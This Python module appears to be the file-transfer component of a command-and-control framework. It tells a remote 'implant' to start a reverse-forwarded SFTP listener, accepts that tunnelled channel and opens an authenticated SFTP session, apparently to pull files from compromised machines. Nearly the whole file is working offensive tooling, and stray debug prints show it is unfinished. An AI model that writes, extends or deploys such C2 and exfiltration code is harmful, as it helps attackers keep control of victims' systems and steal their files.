import os, time, logging, socket
from typing import Tuple, Optional
import paramiko
from ..session.client_session import ClientSession
from .tunnel_handler import get_tunnel_manager

logger = logging.getLogger('c2.FileTransfer')

class FileTransfer:
    def __init__(self, download_dir: str):
        self.download_dir = download_dir
        os.makedirs(download_dir, exist_ok=True)
        self.tunnel_manager = get_tunnel_manager()
        self.sftp_port = 2222

    def _create_sftp_connection(
        self, client: ClientSession
    ) -> Tuple[Optional[paramiko.Transport], Optional[paramiko.SFTPClient]]:
        """
        1) Tell implant to start its reverse-forward listener.
        2) Accept the forwarded-TCPIP channel.
        3) Wrap that channel in a Transport and build an SFTPClient.
        """
        transport = None
        sftp = None

        # 1) ask the implant to forward its port
        resp = client.send_command("!sftp start")
        if "SFTP server started" not in resp:
            print(resp)
            logger.error("implant failed to start SFTP")
            return None, None
        
        # 2) accept the forwarded channel from the tunnel manager
        chan = client.transport.accept(2)
        if chan is None:
            logger.error("no forwarded-tcpip channel arrived")
            return None, None

        # 3) wrap the Channel in a Transport
        try:
            print("fffffffffffffffffffffffff")
            transport = paramiko.Transport(chan)
            transport.start_client(timeout=5)
            transport.auth_password(
                username=client.config['username'],
                password=client.config['password']
            )

            print("lalalalalala")
            # 4) finally build the SFTP client
            sftp = paramiko.SFTPClient.from_transport(transport)
            logger.debug("SFTP connection established")
            return transport, sftp

        except Exception as e:
            logger.error(f"SFTP connect failed: {e}")
            if transport:
                transport.close()
            return None, None
